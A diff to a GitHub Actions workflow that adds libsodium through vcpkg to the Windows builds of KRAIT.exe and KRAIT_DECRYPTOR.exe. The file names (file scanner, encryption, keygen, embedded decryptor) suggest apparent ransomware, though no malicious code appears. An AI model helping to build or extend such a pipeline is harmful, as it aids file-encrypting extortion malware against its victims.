@@ -13,20 +13,23 @@ jobs:
       run: |
         if (Test-Path scr) { Rename-Item scr src }
     
-    - name: List files (debug)
+    - name: Install vcpkg and libsodium
       run: |
-        dir
-        if (Test-Path src) { dir src }
-        if (Test-Path decryptor) { dir decryptor }
+        git clone https://github.com/Microsoft/vcpkg.git
+        cd vcpkg
+        .\bootstrap-vcpkg.bat
+        .\vcpkg install libsodium:x64-windows-static
+        echo "VCPKG_ROOT=$env:GITHUB_WORKSPACE\vcpkg" >> $env:GITHUB_ENV
+        echo "$env:GITHUB_WORKSPACE\vcpkg\installed\x64-windows-static\bin" >> $env:GITHUB_PATH
     
-    - name: Install dependencies
+    - name: Install mingw
       run: |
         choco install mingw -y
         echo "C:\mingw64\bin" >> $GITHUB_PATH
     
     - name: Build decryptor
       run: |
-        g++ -O2 -s -static -std=c++17 -I src decryptor/main.cpp src/encryption.cpp src/keygen.cpp src/utils.cpp -o KRAIT_DECRYPTOR.exe -ladvapi32 -luser32 -lgdi32 -lshell32 -liphlpapi -lwbemuuid -lcrypt32 -lws2_32
+        g++ -O2 -s -static -std=c++17 -I src -I vcpkg\installed\x64-windows-static\include decryptor/main.cpp src/encryption.cpp src/keygen.cpp src/utils.cpp -o KRAIT_DECRYPTOR.exe -L vcpkg\installed\x64-windows-static\lib -ladvapi32 -luser32 -lgdi32 -lshell32 -liphlpapi -lwbemuuid -lcrypt32 -lws2_32 -lsodium
     
     - name: Copy decryptor to resources
       run: |
@@ -38,7 +41,7 @@ jobs:
     
     - name: Build main
       run: |
-        g++ -O2 -s -static -std=c++17 -I src src/main.cpp src/encryption.cpp src/file_scanner.cpp src/keygen.cpp src/utils.cpp resources/resource.res -o KRAIT.exe -ladvapi32 -luser32 -lgdi32 -lshell32 -liphlpapi -lwbemuuid -lcrypt32 -lws2_32
+        g++ -O2 -s -static -std=c++17 -I src -I vcpkg\installed\x64-windows-static\include src/main.cpp src/encryption.cpp src/file_scanner.cpp src/keygen.cpp src/utils.cpp resources/resource.res -o KRAIT.exe -L vcpkg\installed\x64-windows-static\lib -ladvapi32 -luser32 -lgdi32 -lshell32 -liphlpapi -lwbemuuid -lcrypt32 -lws2_32 -lsodium
     
     - name: Upload artifacts
       uses: actions/upload-artifact@v4
